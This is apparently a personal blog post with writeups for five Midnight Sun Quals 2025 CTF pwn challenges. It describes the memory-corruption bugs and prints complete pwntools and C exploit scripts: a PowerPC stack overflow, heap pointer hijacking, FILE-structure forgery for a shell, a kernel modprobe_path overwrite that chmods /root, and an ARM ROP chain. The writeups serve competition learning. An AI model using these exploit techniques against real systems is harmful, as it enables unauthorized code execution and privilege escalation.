---
date: 2025-05-18 10:21:56
layout: post
title: Midnight Sun Quals 2025 writeup
subtitle: 
description: >-
    first time not sleeping from 0 a.m. to 7 a.m. in a CTF, quite tired afterwards
image: >-
  /assets/img/uploads/midnight_sun_ending.png
optimized_image: >-
  /assets/img/uploads/midnight_sun_ending.png
category: ctf
tags:
  - pwn
  - writeup
  - kernel pwn
author: rosayxy
paginate: true
---
Played this ctf with blue-lotus teamates, done 4/5 of the pwn challenges (actually speed pwn challenges lol), finished the not solved pwn challenge today, and had a great time!   

Here are the writeups

## sp33d1
When solving this challenge, I spent a lot of time figuring out how to debug it. It is a powerpc-32-big architecture. Luckily, I found [this reference](https://tttang.com/archive/1695/#toc__8), which introduced it.    
Collaborated with and accompanied by jiegec during this process, and finally solved it.
### vuln

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+8h] [-18h] BYREF

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout[0], 0, 2, 0);
  printf("pwn: ");
  gets(&v4);
  return 0;
}
```
this gets introduces a stack overflow vuln

### debug
As is introduced in [this ref](https://tttang.com/archive/1695/#toc__8), we start the process with `p = process(["qemu-ppc","-g","1234", binary_path]) ` command in our pwntools script, then we start a new terminal, and run the following command to attach gdb to the qemu process:
```bash
gdb-multiarch ./sp33d1
target remote :1234
```

### exp

We need to control the r3 register to point to "/bin/sh" when calling "system", luckily, we have this gadget:
```asm
lwz       r3, 8(r31)
bl        system
```

Also, when returning from the `main` function, r31 is loaded from `-4(r11)` so that we can control the value of r31     
At first, I plan to put "/bin/sh" addr on stack and point r31 to it, but it will require an additional stack leak, which is quite nasty.  
Then I rubber-duck-debugged the problem with my awesome boyfriend jiegec. I checked the cross reference to the address of "/bin/sh" and found a pointer in got segment that points to it.    
We control the r31 reg to the got pointer minus 8, and the problem is solved    

```py
from pwn import*
context(log_level = "debug", os = "linux")

context.arch = 'powerpc'
context.bits = 32
context.endian = 'big'
system_addr = 0x10000610
binshell = 0x10077A8C
one_gadget = 0x10007CE4
binary_path = "./sp33d1"
# p = process(["qemu-ppc","-g","1234", binary_path])  
p = remote("sp33d.play.hfsc.tf", 20020)  
elf = ELF("./sp33d1")

payload = b"a"*0x14 + p32(0x100BEF20) + p32(system_addr)*2

p.recvuntil("pwn: ")
p.sendline(payload)
p.interactive()
```

## sp33d2
A simple problem.    
The challenge implements a linked list on heap, each entry is stuffed in a 0x40-malloc-sized chunk and is in the following structure:
```c
struct Node {
    char data[0x38];
    struct Node *next_hardened;
};
```
Note that the `next` pointer is hardened (xor-ed with fs:0x30 and ror-ed)
The vulnerability lies in that we can overwrite the next pointer. Moreover, the program will print such a value when it detected the next pointer is not in data or on heap.
```c
(__readfsqword(0x30u) ^ __ROR8__(next_hardened, 17)) & 0xFFFFFFFFFFFFFFFELL
```

So we do the following:
1. overwrite next_hardened to b"aaaaaaaa", print the value above and leak the __readfsqword(0x30u) and heap address   
2. overwrite the next_hardened pointer to point at stdout at bss segment, the content of the stdout pointer on bss segment will be seen as the data of the next node, so we can print it and get a leak of the libc base address
3. overwrite the next_hardened pointer to point at got entry of strchr, overwrite the address with `system` function address in glibc, and the next round, we input "/bin/sh" and boom!    
```py
from pwn import *
context(log_level = "debug", os = "linux")
# p = process("./sp33d2_patched")
p = remote("sp33d.play.hfsc.tf",1357)
libc = ELF("./libc.so.6")
context(log_level = "debug", os = "linux", arch = "amd64")
def add(content):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("thing: ")
    p.sendline(content)

def print_linkedlist():
    p.recvuntil("> ")
    p.sendline("2")

def ror_8(x, n):
    log.info("ror_8: " + hex(x))
    log.info("n: " + hex(n))
    log.info("ror_8 result: " + hex(((x >> n) | (x << (64 - n)))& 0xFFFFFFFFFFFFFFFF))
    return (((x >> n) | (x << (64 - n)))& 0xFFFFFFFFFFFFFFFF)

def rol_8(x, n):
    log.info("rol_8: " + hex(x))
    log.info("n: " + hex(n))
    log.info("rol_8 result: " + hex(((x << n) | (x >> (64 - n)))& 0xFFFFFFFFFFFFFFFF))
    return (((x << n) | (x >> (64 - n)))& 0xFFFFFFFFFFFFFFFF)

def delete(idx):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("index: ")
    p.sendline(str(idx))

add("XDEBUG: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
print_linkedlist()
p.recvuntil("* [DEBUG] ")
heap_leak = int(p.recvuntil(";")[:-1], 16)
log.info("heap_leak: " + hex(heap_leak))
p.recvuntil("corrupt = ")
corrupt = int(p.recvuntil("\n")[:-1], 16)
log.info("corrupt: " + hex(corrupt))
head_ptr = 0x4040D8
got_ptr = 0x00404010
read_fsword = corrupt ^ ror_8(0x6161616161616161, 17)
log.info("read_fsword: " + hex(read_fsword))
# try leak libc
add(b"XDEBUG: "+b"a"*0x30 + p64(rol_8(read_fsword^(0x4040b0), 17))+b"\n")
# delete(3)
# gdb.attach(p)
# pause()
print_linkedlist()
p.recvuntil("[+] thing 3:")
p.recvuntil("- ")
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("libc_leak: " + hex(libc_leak))
# 0x00007f7237e205c0 - 0x7f7237c1c000 
libc_base = libc_leak - 0x2045c0
log.info("libc_base: " + hex(libc_base))
strchr_got = 0x0404038
add(b"XDEBUG: "+b"b"*0x30 + p64(rol_8(read_fsword^(strchr_got), 17)))
system = libc_base + libc.symbols["system"]
delete(5)
add(p64(system)[:6])
add(b"/bin/sh\x00")
# print_linkedlist()
# gdb.attach(p)
# pause()
p.interactive()
```
This is a fairly easy challenge, but my ida got confused when determining the address of the read on stack, so I spent a lot of time just to figure out how to cover the next pointer before realizing that I can overwrite it directly.    

## sp33d3
an easy problem, the heap addresses are given, and we have arbituary address read and write.   
Thus, the solution is to leak libc through unsorted bin, overwrite IO_list_all to a heap address, construct a fake IO_file on this address with the tactic of [house of apple2](https://bbs.kanxue.com/thread-273832.htm) and get the shell!!

```py
from pwn import *
# p = process("./sp33d3_patched")
p = remote("sp33d.play.hfsc.tf",16522)
context(log_level = "debug", os = "linux", arch = "amd64")
libc = ELF("./libc.so.6")
def add(size):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("size: ")
    p.sendline(str(size))

def delete(addr):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("addr: ")
    p.sendline(hex(addr))

def show(addr, cnt):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("addr: ")
    p.sendline(hex(addr))
    p.recvuntil("count: ")
    p.sendline(str(cnt))

def edit(addr, size, content):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("addr: ")
    p.sendline(hex(addr))
    p.recvuntil("count: ")
    p.sendline(str(size))
    sleep(0.1)
    p.send(content)

# leak first
add(0x410)
heap_leak = int(p.recvline().strip(), 16)
log.info("heap_leak: " + hex(heap_leak))

add(0x20)
chunk2_addr = int(p.recvline().strip(), 16)
log.info("chunk2_addr: " + hex(chunk2_addr))
add(0x20)
chunk3_addr = int(p.recvline().strip(), 16)
log.info("chunk3_addr: " + hex(chunk3_addr))
delete(heap_leak)
show(heap_leak, 0x20)
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("libc_leak: " + hex(libc_leak))   
libc_base = libc_leak - 0x203b20
log.info("libc_base: " + hex(libc_base))

# construct io file
fake_io_addr = heap_leak + 0x20
system_addr=libc_base+libc.sym["system"]
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x205700)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x0202228+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)
edit(heap_leak + 0x20, 0xe8, fake_io_file)
io_list_all = libc_base + 0x02044C0
edit(io_list_all, 8, p64(heap_leak + 0x20))
# gdb.attach(p)
# pause()

p.recvuntil("> ")
p.sendline("5")
p.interactive()
```

## sp33d4
First time solving a kernel pwn challenge in a CTF, and it was quite fun!   
Collaborated it with blingbling (thanks for saving me!!).    

This challenge implements a new syscall: sys_pwn and it offers an arbituary_write_random_number primitive. Also, the random number's lower 32 bits are returned to the user as the return value of the syscall.      

At first, I thought about overwriting some size of a struct to a large number, but it will require a kernel heap leak or such.   

Then blingbling and I thought about brute-forcing writing the modprobe_path to "/home/user/x" bit by bit (this can be done because the random number's lower 32 bits are returned to the user), and then trigger the modprobe_path to be executed.    

Also some fun usages of modprobe_path:   
- https://docs.kernel.org/admin-guide/sysctl/kernel.html#modprobe


### exp
```c
#include <stdio.h>
#include <sys/syscall.h>
#include <stdlib.h>
void get_flag(){
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /root\n/bin/chmod 777 /root/flag' > /home/user/x");
    system("chmod +x /home/user/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
    system("chmod +x /home/user/dummy");
    system("/home/user/dummy");
    sleep(0.3);
    system("cat /root/flag");
    exit(0);
}
int main(){
    char* str = "/home/user/x";
    unsigned long long modprobe_path = 0xFFFFFFFF81A45CA0;
    for(int i = 0; i <= 12; i++){
        while(1){
            unsigned long long ret = syscall(451, modprobe_path + i);
            if(ret%0x100 == (unsigned long long)str[i]){
                printf("Found %c at %llx\n", str[i], modprobe_path + i);
                break;
            }
        }
    }
    printf("Found all characters\n");
    // trigger
    get_flag();
    return 0;
}

```

Then to upload the exploit to remote, I used the same method as the one in [this blog](https://blingblingxuanxuan.github.io/2023/02/06/230206-rwctf2023-digging-into-kernel-3/#%E7%B2%BE%E7%AE%80ELF)    


## sp33d5
The program is a statically-linked The program has a stack overflow and data overflow. At first, I tried to data overflow into the stderr structure on data segment and use the same method as [house of apple2](https://bbs.kanxue.com/thread-273832.htm). However, the program doesn't link a system function, and we don't have good stack pivoting gadgets.    

Working with teamate k4ra5u, we tried stack overflow, but it will cover the pointer on stack, which determines where to write the next number.   

Then we were stuck until the end of the CTF. sad  
Afterwards, we checkout the messages on discord, and found that we can bruteforce the stack address on remote!! The stack address is the same on every run locally, so my best guess is that it has something to do with the implementation of qemu-arm, being different with the version and such. Also this is a 32-bit program, so the cost of bruteforcing is not that high.     

When I was constructing the rop payload, I found it hard to find a "syscall" gadget. I asked k4ra5u for it, and he gave the tip of adding `--thumb` to the ROPgadget command. I was like "wow, I didn't know that".    

Also encountered a problem when using the gadget `0x00019b10 : pop {r0, r1, r2, ip, sp, pc}`, it will give me a sigkill signal at the 0x00019b10, and the regs are all not pop-ed to their new values. Haven't figured out why yet. :(    

Then a good thing, the r2 reg is 0 so we don't need to pop it. Thus, we can use the gadget `0x0003f114 : pop {r0, r1, pc}` which is quite nice.   

Also a tip, when we have to jump to a thumb gadget from a arm gadget, we need to add 1 to the address of the thumb gadget.    

### exp

```py
from pwn import*
context(log_level = "debug", os = "linux")
p = process(["qemu-arm","-g","1234","./sp33d5_patched"])
# do stack overflow
stack_addr = 0x407ffd4c # TODO
#ropchain
pop_r0_r1_r2 = 0x00019b10 # 0x00019b10 : pop {r0, r1, r2, ip, sp, pc}
pop_r4_r6_r7 = 0x48638 # pop {r4, r6, r7, fp, ip, lr, pc}
syscall = 0x00027DE7
pop_r0_r1_pc = 0x0003f114 # **r2 不用设置，一开始就是0** 0x0003f114
binshell_addr = stack_addr - 0x10 # TODO 
stack_addr_zero = stack_addr + 0x50 # TODO
ropchain = [1, 0xb, pop_r0_r1_pc, binshell_addr, stack_addr_zero, syscall, 0]
for i in range(17):
    if i%2 == 0:
        p.recvuntil("num: ")
        p.sendline(str(0x6e69622f)+"\x00") # /bin/sh\x00
    else:
        p.recvuntil("num: ")
        p.sendline(str(0x68732f)+"\x00")

p.recvuntil("num: ")
p.sendline(str(stack_addr) + "\x00")
for i in range(2):
    p.recvuntil("num: ")
    p.sendline("1" + "\x00")

for i in ropchain:
    p.recvuntil("num: ")
    p.sendline(str(i) + "\x00") 

# _=/usr/bin/python3 位于 0x40800033 栈地址不变
p.interactive()
```